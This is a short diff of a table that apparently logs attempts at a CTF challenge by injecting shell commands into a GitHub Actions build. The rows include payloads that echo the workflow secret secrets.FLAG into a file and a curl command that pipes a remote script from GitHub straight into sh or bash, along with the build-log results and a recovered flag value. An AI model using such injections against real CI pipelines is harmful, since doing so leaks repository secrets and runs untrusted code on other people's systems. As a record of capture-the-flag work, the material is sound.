@@ -18,4 +18,5 @@ add | `echo "secrets:${{ secrets.FLAG }}" >> issues` | build log:`echo "secrets:
 add | `c=$(for i in {00000..99999};echo "[$i]")&&echo $c >> issues`| build log:<code>command substitution: line 2: syntax error near unexpected token `echo'</code> | unkown.
 add | `c=$(for i in {00000..99999};echo -e "[$i]")&&echo "$c" >> issues` | build log:<code>command substitution: line 2: syntax error near unexpected token `echo'</code> | unkown.
 add | <code>curl -sL https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CTF/MISC/count.sh %7C sh</code> | build log:`Process completed with exit code 1.` | ?
-add | <code>curl -sL https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CTF/MISC/count.sh %7C bash</code> | ? | ?
+add | <code>curl -sL https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CTF/MISC/count.sh %7C bash</code> | [00000->99999] | no flag.
+add | env:`user: "bin4xin" flag: "52079"` | ? | ?
